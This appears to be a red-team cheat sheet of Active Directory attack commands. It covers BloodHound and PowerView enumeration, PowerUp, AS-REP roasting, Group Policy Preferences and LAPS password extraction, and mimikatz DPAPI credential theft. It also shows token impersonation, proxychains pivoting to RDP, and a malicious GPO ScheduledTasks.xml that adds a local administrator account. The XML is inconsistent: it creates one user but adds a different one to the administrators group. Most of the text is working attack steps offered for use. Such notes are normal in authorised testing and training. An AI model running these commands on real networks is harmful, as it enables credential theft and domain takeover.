## **More fun in AD**

Below are a collection of items to run within a new environment to check for

In addition the bloodhound \(\(Invoke-BloodHound -CollectionMethod All -CompressData -RemoveCSV\) and basic net enumeration \(net view, computers, dclist, domain\_trusts\) try looking for the following:

Next try running

Powerup

```
powershell-import /opt/PowerSploit/Privesc/PowerUp.ps1
powershell Invoke-AllChecks
```

as well as hamrj0y's powerview tips

[https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

**Group functions**

`Get-NetLocalGroup -ComputerName MX01 -GroupName "Remote Management Users"`Gets members of users who can use WinRM on a specific machine.

`Get-NetLocalGroup -ComputerName MX01 -GroupName "Remote Desktop Users"`Gets members of users who can RDP to a specific machine.

**Determine if kerberos pre-auth is not set**

With Powerview

```
# check for users who don't have kerberos preauthentication set
Get-DomainUser -PreauthNotRequired
Get-DomainUser -UACFilter DONT_REQ_PREAUTH
```

With ASREPRoast

https://github.com/HarmJ0y/ASREPRoast

```
powershell-import ASREPRoast.ps1
Invoke-ASREPRoast -Verbose | fl
```

**PlainText Passwords**

```

#Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
powershell-import /opt/PowerSploit/Exfiltration/Get-GPPPassword.ps1
powershell Get-GPPPassword

https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1
```

Note: Great cheat sheets for powerview, powerup,powersploit, etc.

```
https://github.com/HarmJ0y/CheatSheets
```

Note: A great tool for cracking hashes is kwprocessor

```
./kwp -z basechars/full.base keymaps/en.keymap routes/2-to-16-max-3-direction-changes.route > largekwpshift.txt
```

**LAPS:**

Note: This access is not currently in Bloodhound but is planned for a future update

```
#Import the script into memory
powershell-import /opt/LAPSToolkit/LAPSToolkit.ps1

#Searches through all OUs to see which AD groups can read the ms-Mcs-AdmPwd attribute
powershell Find-LAPSDelegatedGroups

#Parses through ExtendedRights for each AD computer with LAPS enabled and looks for which group has read access and if any user has "All Extended Rights".
powershell Find-AdmPwdExtendedRights 

#Displays all computers with LAPS enabled, password expriation, and password if user has access
powershell Get-LAPSComputers
```

[https://www.harmj0y.net/blog/powershell/running-laps-with-powerview/](https://www.harmj0y.net/blog/powershell/running-laps-with-powerview/)

[https://www.pentestgeek.com/penetration-testing/another-lap-around-microsoft-laps](https://www.pentestgeek.com/penetration-testing/another-lap-around-microsoft-laps)

**Token Notes:**

You can create a token and pass to obtain a shell when not in elevated process. Additionally, only psexec/psexec\_psh work with make\_token, not winrm or wmi

```
make_token .\Administrator P@ssw0rd
ls \\dc01\c$
```

**Credential Manager & DPAPI:**

If assume / know the machine is used for RDP, there might be saved credentials.

```
shell vaultcmd /listcreds:"Windows Credentials" /all
```

These credentials are stored within the users directory,:

```
powershell Get-ChildItem C:\Users\<User>\AppData\Local\Microsoft\Credentials\ -Force
```

Take the output from above command to get details

```
mimikatz dpapi::cred /in:C:\Users\<User>\AppData\Local\Microsoft\Credentials\<File Name from above command>
```

Get the Masterkey from cache

```
mimikatz !sekurlsa::dpapi
```

Obtain password

```
mimikatz dpapi::cred /in:C:\Users\<User>\AppData\Local\Microsoft\Credentials\<File Name from earlier command> /masterkey:<key from above command>
```

**Proxychains & RDP:**

```
beacon> socks 1337
nano /etc/proxychains.conf socks4 127.0.0.1 1337
proxychains xfreerdp /u:<username> /v:<IPADDRESS>
```

**GPO Permissions:**

[https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)

```
powershell-import /opt/Empire/data/module_source/situational_awareness/network/powerview.ps1

#this outputs the GPOs applied to the WKS01 system
powershell Get-NetGPO -ComputerName WKS01
```

GPOs can also be viewed in blooodhound now, first type system name in the search field, click node then look at effective inbound GPOs, if one is hanging off from the rest then look into it by noting the GUID and then looking at the ouput of the poweshell command above

```
powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}
```

note the applicable  gpcfilesyspath and then  
 determine what you can edit and possibly upload a malicious ScheduledTasks.xml

Example Malicious XML

```
<?xml version="1.0" encoding="utf-8"?>
<ScheduledTasks clsid="{XXXXXXX-XXXX-XXXX-XXXX-XXXXXXXX}">
    <ImmediateTaskV5 clsid="{XXXXXXX-XXXX-XXXX-XXXX-XXXXXXXX}" name="OLDGPO" image="0" changed="2016-03-20 12:50:28" uid="{XXXXXXX-XXXX-XXXX-XXXX-XXXXXXXX}" userContext="0" removePolicy="0">
        <Properties action="C" name="OLDGPO" runAs="NT AUTHORITY\System" logonType="S4U">
            <Task version="1.3">
                <RegistrationInfo>
                    <Author>NT AUTHORITY\System</Author>
                    <Description></Description>
                </RegistrationInfo>
                <Principals>
                    <Principal id="Author">
                        <UserId>NT AUTHORITY\System</UserId>
                        <RunLevel>HighestAvailable</RunLevel>
                        <LogonType>S4U</LogonType>
                    </Principal>
                </Principals>
                <Settings>
                    <IdleSettings>
                        <Duration>PT10M</Duration>
                        <WaitTimeout>PT1H</WaitTimeout>
                        <StopOnIdleEnd>true</StopOnIdleEnd>
                        <RestartOnIdle>false</RestartOnIdle>
                    </IdleSettings>
                    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
                    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
                    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
                    <AllowHardTerminate>false</AllowHardTerminate>
                    <StartWhenAvailable>true</StartWhenAvailable>
                    <AllowStartOnDemand>false</AllowStartOnDemand>
                    <Enabled>true</Enabled>
                    <Hidden>true</Hidden>
                    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
                    <Priority>7</Priority>
                    <DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter>
                    <RestartOnFailure>
                        <Interval>PT15M</Interval>
                        <Count>3</Count>
                    </RestartOnFailure>
                </Settings>
                <Actions Context="Author">
                    <Exec>
                        <Command>powershell</Command>
                        <Arguments>-c "net user coolguy P@ssw0rd1234 /add; net localgroup administrators torch /add"</Arguments>
                    </Exec>
                </Actions>
                <Triggers>
                    <TimeTrigger>
                        <StartBoundary>%LocalTimeXmlEx%</StartBoundary>
                        <EndBoundary>%LocalTimeXmlEx%</EndBoundary>
                        <Enabled>true</Enabled>
                    </TimeTrigger>
                </Triggers>
            </Task>
        </Properties>
    </ImmediateTaskV5>
</ScheduledTasks>
```

**Resources:**

[https://rastamouse.me/2017/08/jumping-network-segregation-with-rdp/](https://rastamouse.me/2017/08/jumping-network-segregation-with-rdp/)

[http://www.harmj0y.net/blog/activedirectory/roasting-as-reps/](https://legacy.gitbook.com/book/d00mfist1/ctf/edit#)

[https://chryzsh.gitbooks.io/darthsidious/content/enumeration/powerview.html](https://chryzsh.gitbooks.io/darthsidious/content/enumeration/powerview.html)

